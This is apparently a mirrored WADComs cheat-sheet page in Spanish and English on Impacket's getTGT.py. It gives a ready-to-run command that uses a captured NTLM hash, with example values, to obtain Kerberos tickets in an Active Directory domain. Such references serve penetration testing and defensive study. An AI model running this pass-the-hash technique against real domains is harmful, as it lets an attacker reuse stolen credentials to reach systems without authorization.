# WADComs: Impacket-getTGT

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Hash`, `Username`

**Sistema:** `Linux`, `Windows`

## Descripción

Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.

Command Reference:

	Target IP: 10.10.10.1

	Domain: test.local

	Username: john

	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7

## Comando

```bash
python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
```

## Referencias

- https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py
- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
